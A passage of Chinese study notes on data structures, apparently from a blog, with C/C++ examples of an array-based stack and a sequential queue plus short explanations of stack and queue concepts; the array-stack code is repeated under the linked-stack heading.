class="hljs-string">&quot;原链表: &quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 复制链表</span><br>    LinkList* copiedHead = <span class="hljs-built_in">CopyList</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;复制后的链表: &quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(copiedHead);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h4 id="顺序栈的实现"><a href="#顺序栈的实现" class="headerlink" title="顺序栈的实现"></a>顺序栈的实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 栈的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 存储栈中元素的数组</span><br>    <span class="hljs-type">int</span> top;            <span class="hljs-comment">// 栈顶指针，表示栈顶元素的索引</span><br>&#125; Stack;<br><br><span class="hljs-comment">// 初始化栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 初始化时栈顶指针为-1，表示空栈</span><br>&#125;<br><br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// 判断栈是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 入栈操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈满，无法入栈\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 栈满，入栈失败</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// 先将栈顶指针加1，再存入元素</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 出栈操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空，无法出栈\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈空，出栈失败，返回特殊值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// 取出栈顶元素，并将栈顶指针减1</span><br>&#125;<br><br><span class="hljs-comment">// 查看栈顶元素</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空，无法查看栈顶元素\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈空，查看失败，返回特殊值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top]; <span class="hljs-comment">// 返回栈顶元素</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value = <span class="hljs-built_in">Peek</span>(&amp;stack);<br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 检查返回值是否有效</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈顶元素为: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(&amp;stack)) &#123;<br>        value = <span class="hljs-built_in">Pop</span>(&amp;stack);<br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 检查返回值是否有效</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出栈元素: %d\n&quot;</span>, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="栈的链式结构"><a href="#栈的链式结构" class="headerlink" title="栈的链式结构"></a><strong>栈的链式结构</strong></h4><p>top  -&gt; 顶 -&gt;  …  -&gt; 底</p><p> <strong>栈顶结点：</strong></p><ul><li>位于链表的头部，指向下一个元素。<br><strong>栈底结点：</strong></li><li>位于链表的尾部，没有后续元素。<br><strong>链表表示：</strong><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">top</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a1</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">a2</span> -&gt;</span> ... -&gt; an<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 栈的最大容量</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 存储栈中元素的数组</span><br>    <span class="hljs-type">int</span> top;            <span class="hljs-comment">// 栈顶指针，表示栈顶元素的索引</span><br>&#125; Stack;<br><br><span class="hljs-comment">// 初始化栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitStack</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    stack-&gt;top = <span class="hljs-number">-1</span>; <span class="hljs-comment">// 初始化时栈顶指针为-1，表示空栈</span><br>&#125;<br><br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// 判断栈是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack-&gt;top == MAX_SIZE - <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 入栈操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack *stack, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈满，无法入栈\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 栈满，入栈失败</span><br>    &#125;<br>    stack-&gt;data[++stack-&gt;top] = value; <span class="hljs-comment">// 先将栈顶指针加1，再存入元素</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 出栈操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Pop</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空，无法出栈\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈空，出栈失败，返回特殊值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top--]; <span class="hljs-comment">// 取出栈顶元素，并将栈顶指针减1</span><br>&#125;<br><br><span class="hljs-comment">// 查看栈顶元素</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Peek</span><span class="hljs-params">(Stack *stack)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(stack)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈空，无法查看栈顶元素\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈空，查看失败，返回特殊值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> stack-&gt;data[stack-&gt;top]; <span class="hljs-comment">// 返回栈顶元素</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Stack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-type">int</span> value = <span class="hljs-built_in">Peek</span>(&amp;stack);<br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 检查返回值是否有效</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;栈顶元素为: %d\n&quot;</span>, value);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(&amp;stack)) &#123;<br>        value = <span class="hljs-built_in">Pop</span>(&amp;stack);<br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">// 检查返回值是否有效</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出栈元素: %d\n&quot;</span>, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>队列是一种先进先出（FIFO）的数据结构，元素从队尾入队，从队头出队。它的基本操作包括入队（Enqueue）、出队（Dequeue）、取队头（Peek&#x2F;Front）和判定队空（IsEmpty）。</p><ul><li><strong>队列（Queue）</strong>：一种操作受限的线性表，只允许在表的一端进行插入，而在表的另一端进行删除。</li></ul><p><strong>基本操作：</strong></p><ol><li><strong>入队或进队（Enqueue）</strong>：元素从队列尾部进入队列。</li><li><strong>出队或离队（Dequeue）</strong>：元素从队列头部离开队列。<br><strong>特性：</strong></li></ol><ul><li><strong>先进先出（First-In-First-Out, FIFO）</strong><br><strong>结构示意图：</strong><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">a1</span>, <span class="hljs-built_in">a2</span>, <span class="hljs-built_in">a3</span>, <span class="hljs-built_in">a4</span><br>↑               ↑<br>队头(队首)      队尾<br></code></pre></td></tr></table></figure></li><li>允许插入的一端称为<strong>队尾</strong>，</li><li>允许删除的一端称为<strong>队首</strong>，</li><li>队列具有<strong>先进先出</strong>的特点。<br>通过以上笔记，可以清晰地理解队列的定义、操作以及其特有的“先进先出”的特性。</li></ul><p>好的，以下是关于队列存储结构的数据结构笔记：</p><h4 id="队列的顺序存储"><a href="#队列的顺序存储" class="headerlink" title="队列的顺序存储"></a>队列的顺序存储</h4><p><strong>定义：</strong></p><ul><li>队列是一种先进先出（FIFO）的数据结构。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// 队列的最大容量</span></span><br><br><span class="hljs-comment">// 定义顺序队列结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 用数组存储队列元素</span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// 队列头索引</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// 队列尾索引</span><br>&#125; Queue;<br><br><span class="hljs-comment">// 初始化队列</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-number">0</span>;<br>    queue-&gt;rear = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == queue-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// 判断队列是否已满</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;rear == MAX_SIZE;<br>&#125;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列已满，无法插入元素\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    queue-&gt;data[queue-&gt;rear] = value;<br>    queue-&gt;rear++;<br>&#125;<br><br><span class="hljs-comment">// 出队操作</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法删除元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> value = queue-&gt;data[queue-&gt;front];<br>    queue-&gt;front++;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// 获取队列头部元素</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空，无法获取元素\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;data[queue-&gt;front];<br>&#125;<br><br><span class="hljs-comment">// 打印队列内容</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列为空\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = queue-&gt;front; i &lt; queue-&gt;rear; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, queue-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// 初始化队列</span><br><br>    <span class="hljs-comment">// 入队一些元素</span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印队列内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 出队一个元素</span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队的元素为：%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;出队后队列内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// 获取队列头部元素</span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;队列头部元素为：%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// 释放队列内存</span><br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键点：</strong></p><ul><li><p><strong>定义结构体 Queue</strong>：</p><ul><li><code>int data[MAX_SIZE];</code> 用数组存储队列元素，<code>MAX_SIZE</code> 为队列的最大容量。</li><li><code>int front;</code> 表示队列头部的索引。</li><li><code>int rear;</code> 表示队列尾部的索引。</li></ul><p><strong>初始化队列</strong>：</p><ul><li><code>InitQueue()</code> 初始化队列，<code>front</code> 和 <code>rear</code> 都设为 0，表示队列为空。</li></ul><p><strong>判断队列状态</strong>：</p><ul><li><code>IsEmpty(queue)</code> 判断队列是否为空：<code>front == rear</code> 表示队列为空。</li><li><code>IsFull(queue)</code> 判断队列是否已满：<code>rear == MAX_SIZE</code> 表示队列满。</li></ul><p><strong>入队操作（Enqueue）</strong>：</p><ul><li><code>Enqueue(queue, value)</code> 向队列末尾插入新元素，将新值存储在 <code>data[rear]</code>，然后 <code>rear++</code>。</li></ul><p><strong>出队操作（Dequeue）</strong>：</p><ul><li><code>Dequeue(queue)</code> 删除队列头部元素，从队列头部移除元素，返回 <code>data[front]</code> 的值，然后 <code>front++</code>。</li></ul><p><strong>获取队列头部元素</strong>：</p><ul><li><code>GetFront(queue)</code> 返回队列头部的元素，不改变队列结构。</li></ul><p><strong>打印队列内容</strong>：</p><ul><li><code>PrintQueue(queue)</code> 从 <code>front</code> 到 <code>rear</code> 打印队列中的所有元素。</li></ul></li></ul><h4 id="队列的链式存储"><a href="#队列的链式存储" class="headerlink" title="队列的链式存储"></a>队列的链式存储</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 